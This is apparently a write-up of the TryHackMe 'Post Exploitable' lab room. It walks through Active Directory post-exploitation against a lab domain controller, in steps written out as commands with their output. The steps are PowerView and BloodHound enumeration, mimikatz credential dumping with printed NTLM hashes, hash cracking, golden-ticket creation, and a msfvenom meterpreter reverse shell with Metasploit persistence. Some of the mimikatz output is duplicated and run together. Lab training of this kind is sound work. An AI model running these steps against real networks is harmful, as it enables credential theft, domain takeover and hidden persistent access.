# Post Exploitable

----------------------------

> https://tryhackme.com/room/postexploit

> IP : 10.10.189.246

--------------------------

**Given Credentials**
```
ssh/Rdp connect

User:Administrator
Pass:P@$$W0rd
Domain:Controller
```

`powershell -ep bypass` 

>ep bypasses the execution policy of powershell allowing you to easily run scripts

```
Controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> 
```

---------------------------------------------------

**Enumeration w/ Powerview**

> starting powerview tool in powershell

```
PS C:\Users\Administrator\Downloads> ls


    Directory: C:\Users\Administrator\Downloads


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/14/2020  11:39 AM        1261832 mimikatz.exe
-a----        5/14/2020  11:41 AM         374625 PowerView.ps1
-a----        5/14/2020  11:43 AM         973325 SharpHound.ps1


PS C:\Users\Administrator\Downloads> .\PowerView.ps1
```

_Enumerate the domain users_ - `Get-NetUser | select cn`

```
PS C:\Users\Administrator> Get-NetUser | select cn

cn
--
Administrator
Guest
krbtgt
Machine-1
Admin2
Machine-2
SQL Service
POST{P0W3RV13W_FTW}
sshd
```



_Enumerate the domain groups_ - `Get-NetGroup -GroupName *admin*`
```
PS C:\Users\Administrator> Get-NetGroup -GroupName *admin*
Administrators 
Hyper-V Administrators
Storage Replica Administrators
Schema Admins
Enterprise Admins
Domain Admins
Key Admins
Enterprise Key Admins
DnsAdmins
```
> Here's a cheatsheet to help you with commands: 
> https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

**Answering Question from this section**

```
1.What is the shared folder that is not set by default? 

=> share

```
Explaination

> just see the hint : Invoke-ShareFinder

```
PS C:\Users\Administrator> Invoke-ShareFinder
\\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin 
\\Domain-Controller.CONTROLLER.local\C$         - Default share
\\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC
\\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share
\\Domain-Controller.CONTROLLER.local\Share      -
\\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share
```
-------------------------------

```
2.What operating system is running inside of the network besides Windows Server 2019?

=> Windows 10 Enterprise Evaluation

```
```
PS C:\Users\Administrator> Get-NetComputer -fulldata | select operatingsystem   

operatingsystem
---------------
Windows Server 2019 Standard
Windows 10 Enterprise Evaluation
Windows 10 Enterprise Evaluation
```
---------------------------------------
```
3.I've hidden a flag inside of the users find it

=> POST{P0W3RV13W_FTW}
```
Explaination 

> Refer to Enumuration part above 

----------------------------------------
_________________________________________

**Enumeration w/ Bloodhound**

BloodHound Installation -
```
1.) apt-get install bloodhound    

2.) neo4j console - default credentials -> neo4j:neo4j
```
Getting loot w/ SharpHound -
```
1.) powershell -ep bypass same as with PowerView

2.) . .\Downloads\SharpHound.ps1    

3.) Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip 
```
```
PS C:\Users\Administrator>  . .\Downloads\SharpHound.ps1
PS C:\Users\Administrator> Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
----------------------------------------------
Initializing SharpHound at 2:48 AM on 2/6/2022
----------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain CONTROLLER.LOCAL using path CN=Schema,CN=Configuration,DC=CONTROLLER,DC=LOCAL
PS C:\Users\Administrator> [+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 104 MB RAM
Status: 66 objects finished (+66 66)/s -- Using 107 MB RAM
Enumeration finished in 00:00:01.2154975
Compressing data to C:\Users\Administrator\20220206024805_loot.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 2:48 AM on 2/6/2022! Happy Graphing!
```
Transfer the loot.zip file to your local machine 

> note: you can use scp to transfer the file if you’re using ssh

		scp Administrator@controller:C:/Users/Administrator/20220206024805_loot.zip .

```
┌──(kali㉿kali)-[~/thm/machine/post-exploitation]
└─$ scp Administrator@controller:C:/Users/Administrator/20220206024805_loot.zip .
Administrator@controller's password: 
20220206024805_loot.zi 100% 9574    55.9KB/s   00:00 
```
Change password of Neo4j and login into bloodhound

**Answering Question from this section**

```
1.What service is also a domain admin?

=> sqlservice
```
-----------------------
```
2.What two users are Kerberoastable?

=> sqlservice,krbtgt
```
----------------------
_________________________

**Dumping hashes w/ mimikatz**

Dump Hashes w/ mimikatz -
```
1.) cd Downloads && mimikatz.exe 
```
> this will cd into the directory that mimikatz is kept as well as run the mimikatz binary

```
PS C:\Users\Administrator\Downloads> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 May  2 2020 16:23:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 

mimikatz #
```

`2.) privilege::debug `
> ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly
```
mimikatz # privilege::debug 
Privilege '20' OK 
```
`3.) lsadump::lsa /patch`
> dump those hashes

```
mimikatz # lsadump::lsa /patch 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6 

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
NTLM : 64f12cddaa88057e06a81b54e73b949b

RID  : 00000451 (1105)
User : Admin2
LM   :
NTLM : 2b576acbe6bcfda7294d6bd18041b8fe

RID  : 00000452 (1106)
User : Machine2
LM   :
NTLM : c39f2beb3d2ec06a62cb887fb391dee0

RID  : 00000453 (1107)
User : SQLService
LM   :
NTLM : f4ab68f27303bcb4024650d8fc5f973a
NTLM : 64f12cddaa88057e06a81b54e73b949b

RID  : 00000451 (1105)
User : Admin2
LM   :
NTLM : 2b576acbe6bcfda7294d6bd18041b8fe
RID  : 00000452 (1106)User : Machine2
LM   :NTLM : c39f2beb3d2ec06a62cb887fb391dee0
RID  : 00000453 (1107)
User : SQLServiceLM   :
NTLM : f4ab68f27303bcb4024650d8fc5f973a
RID  : 00000454 (1108)User : POST
LM   :NTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2
RID  : 00000457 (1111)
User : sshdLM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6
RID  : 000003e8 (1000)User : DOMAIN-CONTROLL$
LM   :NTLM : d3290b5bbb901c3b3a756afc4e47bec1
RID  : 00000455 (1109)
User : DESKTOP-2$LM   :
NTLM : 3c2d4759eb9884d7a935fe71a8e0f54c
RID  : 00000456 (1110)User : DESKTOP-1$
LM   :NTLM : 7d33346eeb11a4f12a6c201faaa0d89a
```
**Crack those hashes w/ hashcat﻿**

`hashcat -m 1000 <hash> rockyou.txt`

>you can also use john or crackstation.net to crack that NTLM hash

**Answering Question from this section**

```
1.what is the Machine1 Password?

=> Password1
```
------------------------

```
2.What is the Machine2 Hash?

=>c39f2beb3d2ec06a62cb887fb391dee0
```
_Explaination_ : See the above scan results 

--------------------------------
________________________________

**Golden Ticket Attacks w/ mimikatz**

Dump the krbtgt Hash -

`1.) cd downloads && mimikatz.exe ` 

`2.) privilege::debug `
>ensure this outputs [privilege "20" ok]

`3.) lsadump::lsa /inject /name:krbtgt `
> This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket

`4.)kerberos::golden /user: /domain: /sid: /krbtgt: /id:`
>Create a Golden Ticket

`5.)misc::cmd`
>Use the Golden Ticket to access other machine

-----------------------------------
______________________________

**Enumeration w/ Server Manager**

Connect to the RDP with the credentials given 

**Answering Question from this section**

```
1.What tool allows to view the event logs?

=> Event Viewer
```
----------------------

```
2.What is the SQL Service password?

=> Mypassword123$
```
----------------------
_______________________

**Maintaining Access**

```
1.) msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe this will generate a basic windows meterpreter reverse tcp shell

2.) Transfer the payload from your attacker machine to the target machine.

3.) use exploit/multi/handler - this will create a listener on the port that you set it on.

4.) Configure our payload to be a windows meterpreter shell: set payload windows/meterpreter/reverse_tcp

5.) After setting your THM IP address as your "LHOST", start the listener with run

6.)  Executing the binary on the windows machine will give you a meterpreter shell back on your host - let's return to that

7.) Verify that we've got a meterpreter shell, where we will then background it to run the persistence module.
```
Run the Persistence Module -

```
1.) use exploit/windows/local/persistence this module will send a payload every 10 seconds in default however you can set this time to anything you want

2.) set session 1 set the session to the session that we backgrounded in meterpreter (you can use the sessions command in metasploit to list the active sessions)
```
_CC @prakashchand72_

---------------------------
